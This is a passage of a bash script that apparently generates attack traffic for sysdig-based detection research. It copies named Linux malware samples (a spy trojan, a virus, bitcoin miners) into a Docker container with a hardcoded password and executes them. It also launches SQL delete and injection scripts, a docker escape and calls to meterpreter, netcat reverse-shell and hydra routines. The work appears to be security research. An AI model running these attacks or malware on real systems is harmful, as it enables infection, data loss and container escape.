	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Trojan-Spy.Linux.Pymadro.a-fcbfb234b912c84e052a4a /tmp/Virus/Trojan-Spy.Linux.Pymadro.a-fcbfb234b912c84e052a4a
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Trojan-Spy.Linux.Pymadro.a-fcbfb234b912c84e052a4a &> /dev/null &
	sleep 1.1004
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 38 ]]; then
	logger 'Linux Malware - Virus.Linux.RST.b-f7e34d56daae900fd925fbf252f20139'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Virus.Linux.RST.b-f7e34d56daae900fd925fbf252f20139 /tmp/Virus/Virus.Linux.RST.b-f7e34d56daae900fd925fbf252f20139
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Virus.Linux.RST.b-f7e34d56daae900fd925fbf252f20139 &> /dev/null &
	sleep 1.1343
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 39 ]]; then
	logger 'Linux Malware - not-a-virus:HEUR:RiskTool.Linux.BitCoinMiner.b-5435e38d7bfcc398beeb3eae8100589e'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/not-a-virus:HEUR:RiskTool.Linux.BitCoinMiner.b-5435e38d7bfcc398beeb3eae8100589e /tmp/Virus/not-a-virus:HEUR:RiskTool.Linux.BitCoinMiner.b-5435e38d7bfcc398beeb3eae8100589e
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/not-a-virus:HEUR:RiskTool.Linux.BitCoinMiner.b-5435e38d7bfcc398beeb3eae8100589e &> /dev/null &
	sleep 1.2814
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 40 ]]; then
	logger 'Linux Malware - not-a-virus:HEUR:RiskTool.Linux.BitCoinMiner.a-7f283622d2ec27342e0a2219a595c4cd'
	ftp_flag=$((($RANDOM % 2) + 1))
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/not-a-virus:HEUR:RiskTool.Linux.BitCoinMiner.a-7f283622d2ec27342e0a2219a595c4cd &
	sleep 1.1582
	sudo docker exec -i test-mysql kill -9 -1
fi
}

SQL_misbehavior_delete ()
{
logger "SQL Delete"
sudo docker exec -i test-mysql mysql -uroot -ppinchen < ~/test-mysql/SQLBehavior/delete.sql 2> /dev/null
}

SQL_misbeharvior_injection ()
{
logger "SQL Injection"
sudo docker exec -i test-mysql mysql -uroot -ppinchen < ~/test-mysql/SQLBehavior/injection.sql 2> /dev/null
}


docker_escape_runner ()
{
logger "docker_escape"
tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/escape &
sleep 2
sudo docker exec -it test-mysql /bin/sh 
}

all_runner ()
{
echo "**************************************************"
echo "Malicious Runner Start!"
while [ "$(pgrep sysdig)" = "" ]; do
	echo "Sysdig is not running!"
	sleep 0.5
done

start=$(date +%s)
python_counter=0
meterpreter_counter=0
remote_shell_counter=0
SQL_delete_counter=0
SQL_injection_counter=0
Hydra_counter=0
malware_counter=0
while [[  $(($(date +%s) - $start )) -le $1 ]]; do
	flag_num=$(( ( $RANDOM % 10 )  + 1  ))
	echo -n "Flag bit is $flag_num..."
	if [[ $flag_num -ge 7 ]]; then #change this number to have more attacks
		attack_flag=$(( ( $RANDOM % 10 )  + 1  ))
		if [[ $attack_flag -eq 0 ]]; then
			python_runner
			python_counter=$(( python_counter+  1 ))
		fi
		if [[ $attack_flag -eq 1 ]]; then
			meterpreter_runner
			meterpreter_counter=$(( meterpreter_counter + 1 ))
		fi
		if [[ $attack_flag -eq 2 ]]; then
			nc_remote_shell
			remote_shell_counter=$(( remote_shell_counter + 1 ))
		fi
		if [[ $attack_flag -eq 3 ]]; then
			SQL_misbehavior_delete
			SQL_delete_counter=$(( SQL_delete_counter + 1 ))
		fi
		if [[ $attack_flag -eq 4 ]]; then
			SQL_misbeharvior_injection
			SQL_injection_counter=$(( SQL_injection_counter + 1 ))
		fi
		if [[ $attack_flag -eq 5 ]]; then
			hydra_runner
			Hydra_counter=$(( Hydra_counter + 1 ))
		fi
		if [[ $attack_flag -ge 6 ]]; then
			malware_runner
			malware_counter=$(( malware_counter + 1 ))
		fi
	else
		echo "I will do nothing in this round except sleeping for 2 seconds..."
		sleep 2
		####
		# NOTES:
		# Change this interval to have more attacks
		####
	fi
done

echo "Malicious runner attack summary:"
echo "Python_in_memory_malware: $python_counter"
echo "Meterpreter: $meterpreter_counter"
echo "nc_remote_shell: $remote_shell_counter"
echo "SQL_misbehavior: $SQL_delete_counter"
echo "SQL_injection: $SQL_injection_counter"
echo "Linux Malware: $malware_counter"
echo "Total: $((python_counter + meterpreter_counter + remote_shell_counter + SQL_delete_counter + SQL_injection_counter + malware_counter))"
echo "Launching Docker Escape...This attack will modify the docker runtime and ruin the current docker environment..."

docker_escape_runner

rm ~/test-mysql/SQLBehavior/hydra.restore
echo " $( date "+%m-%d-%H:%M:%S" ), done!"
}


single_runner ()
{
echo "**************************************************"
echo "Malicious Runner Start!"
while [ "$(pgrep sysdig)" = "" ]; do
	echo "Sysdig is not running!"
	sleep 0.5
done

start=$(date +%s)
python_counter=0
meterpreter_counter=0
remote_shell_counter=0
SQL_delete_counter=0
SQL_injection_counter=0
Hydra_counter=0
malware_counter=0

while [[  $(($(date +%s) - $start )) -le $2 ]]; do
	flag_num=$(( ( $RANDOM % 10 )  + 1  ))
	echo -n "Flag bit is $flag_num..."
	if [[ $flag_num -ge 3 ]]; then #change this number to have more attacks, default = 8
		if [[ "$1" == "python" ]]; then
			python_runner
			python_counter=$(( python_counter+  1 ))
		fi
		if [[ "$1" == "meterpreter" ]]; then
			meterpreter_runner
			meterpreter_counter=$(( meterpreter_counter + 1 ))
		fi
		if [[ "$1" == "nc" ]]; then
			nc_remote_shell
			remote_shell_counter=$(( remote_shell_counter + 1 ))
		fi
		if [[ "$1" == "delete" ]]; then
			SQL_misbehavior_delete
			SQL_delete_counter=$(( SQL_delete_counter + 1 ))
		fi
		if [[ "$1" == "injection" ]]; then
			SQL_misbeharvior_injection
			SQL_injection_counter=$(( SQL_injection_counter + 1 ))
		fi
		if [[ "$1" == "hydra" ]]; then
			hydra_runner
			Hydra_counter=$(( Hydra_counter + 1 ))
		fi
		if [[ "$1" == "malware" ]]; then
			malware_runner
			malware_counter=$(( malware_counter + 1 ))
		fi
	else
		echo "I will do nothing in this round except sleeping for 2 seconds..."
		sleep 2
		####
		# NOTES:
		# Change this interval to have more attacks
		####
	fi
done

if [[ "$1" == "escape" ]]; then
	echo "Only Escape!"
	echo "Launching Docker Escape...This attack will modify the docker runtime and ruin the current docker environment..."
	docker_escape_runner
else
	echo "Malicious runner attack summary:"
	echo "Python_in_memory_malware: $python_counter"
	echo "Meterpreter: $meterpreter_counter"
	echo "nc_remote_shell: $remote_shell_counter"
	echo "SQL_misbehavior: $SQL_delete_counter"
	echo "SQL_injection: $SQL_injection_counter"
	echo "Linux Malware: $malware_counter"
	echo "Total: $((python_counter + meterpreter_counter + remote_shell_counter + SQL_delete_counter + SQL_injection_counter + malware_counter))"
	rm ~/test-mysql/SQLBehavior/hydra.restore 2> /dev/null
fi

echo " $( date "+%m-%d-%H:%M:%S" ), done!"
}

mode=$1
duration=$2
if [[ "$mode" == "all" ]]; then
	all_runner $2
else
	single_runner $1 $2
fi


